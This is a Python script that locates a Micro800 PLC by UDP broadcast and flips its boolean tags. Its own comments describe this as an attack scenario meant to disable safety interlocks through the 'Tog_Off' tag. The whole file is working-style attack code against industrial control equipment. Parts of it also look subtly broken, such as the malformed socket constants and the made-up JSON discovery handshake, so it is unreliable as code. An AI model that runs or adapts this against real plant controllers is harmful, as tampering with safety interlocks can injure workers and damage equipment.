import pycomm3
import socket
import time

# Configuration - Replace with your actual values if known, otherwise leave as None to attempt discovery
PLC_IP_ADDRESS = None  # Will be discovered if left as None
PLC_CONTROLLER_TYPE = 'Micro800' #Specify the controller family
PLC_PATH = '1,0'  # Route Path (Usually 1,0 for direct connection)
TOG_OFF_TAG = 'Tog_Off'
NEWVARIABLE_TAG = 'NewVariable'  # Example variable to manipulate
SLEEP_TIME = 5  # Seconds to sleep after toggling the variable.  Adjust as needed

def find_plc_ip(controller_type):
    """
    Attempts to discover the PLC's IP address by broadcasting on the network.
    """
    try:
        #Create a UDP socket
        sock = socket.socket(socket.socket.AF_INET, socket.socket.SOCK_DGRAM, socket.socket.IPPROTO_UDP)
        sock.setsockopt(socket.socket.SOL_SOCKET, socket.socket.SO_BROADCAST, 1)
        sock.settimeout(5)  # Wait for 5 seconds

        #Craft the discovery message (adjust based on PLC type if necessary)
        if controller_type == 'Micro800':
             discovery_message = b'{"command": "discover"}'#Micro800 discovery message
        else:
            discovery_message = b'\x00\x01\x00\x00\x00\x00\x00\x00' #General CIP discovery message
        
        sock.sendto(discovery_message, ('<broadcast>', 44818)) #CIP Port (default)
        
        print("Broadcasting discovery message...")
        
        while True:
            try:
                data, addr = sock.recvfrom(1024)  # Adjust buffer size as needed
                print(f"Received response from {addr[0]}: {data}")
                
                #Parse the response (adjust based on PLC type if necessary)
                if controller_type == 'Micro800':
                   try:
                      import json
                      response_data = json.loads(data.decode('utf-8'))
                      if 'ip_address' in response_data:
                          return response_data['ip_address']
                   except json.JSONDecodeError:
                       print("Could not decode JSON response.")
                else:
                   #Example of Parsing CIP Response (adapt for your response)
                   #This is a placeholder, adjust for your controller's discovery response format
                   if len(data) > 20:
                       return addr[0] # Assuming the IP is implicit in the address
            except socket.timeout:
                print("No PLC found within timeout.")
                return None
    except Exception as e:
        print(f"Error during PLC discovery: {e}")
        return None
    finally:
        sock.close()

def toggle_boolean_tag(ip_address, path, tag_name, controller_type):
    """
    Toggles a boolean tag value in the PLC.
    """
    try:
        with pycomm3.LogixDriver(ip_address, comm_path=path, controller_type=controller_type) as plc:
            # Read the current value
            read_result = plc.read(tag_name)
            if read_result.status != 'ok':
                print(f"Error reading {tag_name}: {read_result.status}")
                return False

            current_value = read_result.value
            new_value = not current_value  # Toggle the value

            # Write the new value
            write_result = plc.write(tag_name, new_value)
            if write_result.status != 'ok':
                print(f"Error writing {tag_name}: {write_result.status}")
                return False

            print(f"Successfully toggled {tag_name} from {current_value} to {new_value} on {ip_address}")
            return True

    except Exception as e:
        print(f"An error occurred: {e}")
        return False

def main():
    global PLC_IP_ADDRESS #allows to change global variables

    if not PLC_IP_ADDRESS:
        PLC_IP_ADDRESS = find_plc_ip(PLC_CONTROLLER_TYPE)

        if not PLC_IP_ADDRESS:
            print("Failed to discover PLC IP address.  Please provide the IP address.")
            return
        else:
            print(f"Discovered PLC at IP address: {PLC_IP_ADDRESS}")


    # Example attack scenario: Toggle Tog_Off to potentially disable safety interlocks
    print("Attempting attack scenario: Disabling safety interlocks (Tog_Off)")
    if toggle_boolean_tag(PLC_IP_ADDRESS, PLC_PATH, TOG_OFF_TAG, PLC_CONTROLLER_TYPE):
        print(f"Sleeping for {SLEEP_TIME} seconds...")
        time.sleep(SLEEP_TIME) #Give it time to have an effect
        print("Toggling Tog_Off back to its original state.")
        toggle_boolean_tag(PLC_IP_ADDRESS, PLC_PATH, TOG_OFF_TAG, PLC_CONTROLLER_TYPE) # Revert the change for safety

    else:
        print("Failed to disable safety interlocks.")

    # Example attack scenario: Toggle NewVariable (hypothetical effect)
    print("Attempting attack scenario: Toggling NewVariable (unknown effect)")
    if toggle_boolean_tag(PLC_IP_ADDRESS, PLC_PATH, NEWVARIABLE_TAG, PLC_CONTROLLER_TYPE):
        print(f"Sleeping for {SLEEP_TIME} seconds...")
        time.sleep(SLEEP_TIME) #Give it time to have an effect
        print("Toggling NewVariable back to its original state.")
        toggle_boolean_tag(PLC_IP_ADDRESS, PLC_PATH, NEWVARIABLE_TAG, PLC_CONTROLLER_TYPE) # Revert the change for safety
    else:
        print("Failed to toggle NewVariable.")


if __name__ == "__main__":
    main()